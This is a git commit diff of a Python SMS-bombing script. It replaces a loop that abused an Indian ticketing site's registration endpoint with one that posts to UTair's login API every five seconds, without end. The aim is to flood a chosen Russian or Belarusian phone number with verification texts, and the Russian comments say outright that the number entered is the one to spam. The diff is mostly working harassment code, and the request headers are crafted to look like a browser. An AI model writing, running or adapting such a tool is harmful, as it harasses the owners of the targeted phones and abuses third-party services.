2e0e572664c48766b59230b57a2ae3483a1c09e8
flowerOneZero <107263277+flowerOneZero@users.noreply.github.com>
2022-06-10 23:57:06 +0300

    Update flowerx.py

--- flowerx.py
+++ flowerx.py
@@ -9,10 +9,6 @@ from colorama import Fore, Style
 from requests import get, post
 from user_agent import generate_user_agent
 import os
-#python2
-#from urllib.request import Request,urlopen
-import urllib2,cookielib
-#from urllib.parse import urlencode
 import platform
 import time 
 
@@ -60,34 +56,20 @@ print("     █▀▀ █▀▀▄ █▀▀▄ ▀▀█▀▀ █▀▀ █▀
 print("     █▀▀ █──█ █──█ ──█── █▀▀ █▄▄▀ █▄▄▀ █──█ █▄▄▀")
 print("     ▀▀▀ ▀──▀ ▀▀▀─ ──▀── ▀▀▀ ▀─▀▀ ▀─▀▀ ▀▀▀▀ ▀─▀▀")
 
-#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
+phone = input("Номер: ") #Номер мобильного телефона на который хотите направить спам.
 
-#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=
 
-#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
+phone = str(phone)
 
-def send(num, counter, slep):
-    #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
-    url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
-    #data={"phone":num}
-    hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
-    result_url=url+num
-    req = urllib2.Request(result_url, headers=hdr)
-    for x in range(counter):
-        banner()
-        #print("Target Number          : 01531999473", num)
-        #print("Number of Message Sent : ", x+1)
-        page = urllib2.urlopen(req)
-        #resp1=Request(result_url)
-        #urlopen(resp1)
-        time.sleep(slep)
-
-try:
-    banner()
-    number = raw_input("Enter mobileNumber: ")
-    count = raw_input("Enter number of Message: ")
-    throttle = raw_input("Enter time of sleep: ")
-    send(number,int(count), int(throttle))
-except Exception as e:
-    print(f"{BRIGHT}{RED} Что-то работает не правильно, перезагрузите скрипт! ")
-    
+if (phone[0:2] == "+7" and len(phone[1:]) == 11) or (phone[0:4] == "+375" and len(phone[1:]) == 12): #Делаем проверку, сколько цифр и правильно ли в начале. 
+  while True: # Делаем бескоенчный цикл. 
+    cl = requests.session()
+    cl.get('https://b.utair.ru/api/v1/login/')
+    rSL = requests.post('https://b.utair.ru/api/v1/login/', headers = {"Content-Type":"application/json", "Referer":"https://www.utair.ru/", "Sec-Fetch-Mode":"cors", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.92 (Edition Yx 02)"}, json={"login":phone[1:]}) # Отпраялем запрос.
+    if rSL.status_code == 200: # Делаем проверку на результат. 
+      print("Сообщение от сервиса utAir отправлено.") # Если результат выполнен
+    else: # Если проверка не пройдена
+      print("Сообщение от сервиса utAir не отправлено.")
+    time.sleep(5) # Задержка
+else:
+    print("Номер телефона набран не правильно, повторите попытку")
